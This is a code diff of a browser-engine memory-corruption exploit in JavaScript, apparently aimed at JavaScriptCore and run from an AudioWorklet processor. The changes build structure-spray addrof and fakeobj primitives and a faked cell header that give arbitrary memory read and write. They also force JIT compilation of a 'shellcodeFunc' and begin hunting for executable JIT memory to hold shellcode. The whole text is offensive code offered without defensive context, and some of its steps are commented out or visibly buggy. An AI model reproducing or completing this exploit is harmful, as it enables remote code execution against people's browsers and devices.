@@ -170,6 +170,30 @@ for(var i = 0; i < 0x10000; i++){
 
 
 `); //sprayed doubled array flags and butterfly is victim aka evil_arr
+function makeJITCompiledFunction() {
+    // Some code to avoid inlining...
+    function target(num) {
+        for (var i = 2; i < num; i++) {
+            if (num % i === 0) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    // Force JIT compilation.
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+        target(i);
+    }
+    return target;
+}
+        var shellcodeFunc = makeJITCompiledFunction();
 
 b.process = (inputs, outputs, parameters)=>{
    
@@ -179,8 +203,13 @@ b.process = (inputs, outputs, parameters)=>{
     ary.prop = 1234;
     ary['p'+i] = 13.37;
     structure_spray.push(ary);
+    //structure_spray.push(ary);
+    //structure_spray.push(ary);
+    //structure_spray.push(ary);
 
-var victim1 = structure_spray[0];
+    
+
+var victim1 = structure_spray[1];
     if(stage == "leak"){
         var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
         expected_ptr = Number(expected_ptr);
@@ -278,7 +307,7 @@ var victim1 = structure_spray[0];
         //delete boxed[0];
         //delete boxed[0];
         //theoretically soeaking evil arr is unboxed and boxed is "JSValue or array contingous"
-        var addrof = (obj)=>{
+        var addrof1 = (obj)=>{
             boxed[0] = obj;
             return floatAsQword(evil_arr[boxed_offset]); //get a raw double value represented as
             //as float then convert that to qword
@@ -294,38 +323,45 @@ var victim1 = structure_spray[0];
         header: jscell_header, // cell
         butterfly: victim1, // butterfly
     };
-        var boxed = [{}];
-        var unboxed = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
-        unboxed[0] = 13.37;
-        //var hax = fakeObj(addrof(outer) + 0x10);
+        var boxed1 = [{}];
+        var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
+        unboxed1[0] = 13.37;
+        var hax = fakeObj(addrof1(outer) + 0x10);
         fuck.port.postMessage("we got hax arb r/w obj!!!");
-        /*hax[1] = unboxed;
-        fuck.port.postMessage("shared bfly " + floatAsQword(victim1[1]))
-        var shared = floatAsQword(victim1[0])
-        hax[1] = boxed;
-        victim1[0] = qwordAsFloat(shared);
-        outer.header = jscell_header;*/
+        hax[1] = unboxed1;
+        fuck.port.postMessage("shared bfly " + hex(floatAsQword(victim1[1])))
+        var shared = floatAsQword(victim1[1])
+        hax[1] = boxed1;
+        victim1[1] = qwordAsFloat(shared);
+        outer.header = jscell_header;
         //var origButterfly = hax[1];
 
-        fuck.port.postMessage("here111")
+        //fuck.port.postMessage("here" + addrof1(new Uint8Array(8)))
         //var orig = qwordAsFloat(hax[1])
         //fuck.port.postMessage(orig);
         var memory = {
-        addrof: addrof,
-        fakeobj: fakeObj,
+        addrof: function(victim) {
+            boxed1[0] = victim1;
+            return hex(floatAsQword(unboxed1[0]));
+        },
+
+        fakeobj: function(addr) {
+            unboxed1[0] = qwordAsFloat(addr);
+            return boxed1[0];
+        },
 
         // Write an int64 to the given address.
-        writeInt64(addr, int64) {
+        write64(addr, int64) {
             hax[1] = qwordAsFloat(addr+0x10);
-            victim.pointer = int64;
+            victim.prop = this.fakeobj(int64);
         },
 
         // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
-        write16(addr, value) {
+        /*write16(addr, value) {
             // Set butterfly of victim object and dereference.
             hax[1] = qwordAsFloat(addr+0x10);
-            victim.pointer = value;
-        },
+            victim.prop = this.fakeobj(value);
+        },*/
 
         // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
         write(addr, data) {
@@ -343,8 +379,8 @@ var victim1 = structure_spray[0];
         read64(addr) {
             // Set butterfly of victim object and dereference.
             hax[1] = qwordAsFloat(addr+0x10);
-            return victim.pointer;
-            //return this.addrof(victim.pointer);
+            //return victim.pointer;
+            return this.addrof(victim.prop);
         },
         read: function(addr, length) {
             var a = new Array(length);
@@ -371,8 +407,8 @@ var victim1 = structure_spray[0];
             var obj = {p: v};
 
             var addr = this.addrof(obj);
-            fuck.port.postMessage("test addr" + addr)
-            if(this.fakeObj(addr).p !== v) {
+            fuck.port.postMessage("test addr" + hex(addr))
+            if(this.fakeObj(addr).p != v) {
             fuck.port.postMessage("addrof and/or fakeobj does not work");
             }
 
@@ -385,27 +421,28 @@ var victim1 = structure_spray[0];
     }
 
 
-    memory.test();
+        //memory.test();
         
         //var shared_butterfly = floatAsQword(e[1]);
-        fuck.port.postMessage("we hax1 arb r/w obj!!!");
-        
-    
-        
-            
-        var sinFuncAddr = addrof({});
-        fuck.port.postMessage(sinFuncAddr);
-        var executableAddr = memory.read64(sinFuncAddr);
-        
-        var jitCodeAddr = memory.read64(executableAddr);
-        
-        var rxMemAddr = memory.read64(jitCodeAddr);
-        fuck.port.postMessage(rxMemAddr)
-        
-        fuck.port.postMessage("it works!!!");
+        //memory.adr
+        fuck.port.postMessage("we full stable arb r/w !!!");
 
+        
+        
+        var shellcodeFuncAddr = memory.addrof(Math.sin);
+        fuck.port.postMessage("[+] Shellcode function @ " + shellcodeFuncAddr);
+        
+        //var executableAddr = memory.read64(shellcodeFuncAddr + (3*8)); //3*8
+        //fuck.port.postMessage("[+] Executable instance @ " + executableAddr);
+        
+        //var jitCodeAddr = memory.read64(executableAddr + (3*8)); //3*8
+        //fuck.port.postMessage("[+] JITCode instance @ " + jitCodeAddr);
+        
+        //var rwxMemAddr = memory.read64(jitCodeAddr + (4*8)); //4*8
+        //rwxMemAddr = rwxMemAddr;
+        //printFunc("[+] " + (rwx === true ? "RWX" : "RX") + " memory @ " + rwxMemAddr);
         stage="gc_test"
-        return true;
+        return false;
     }
     else if(stage=="gc_test"){
         gc();
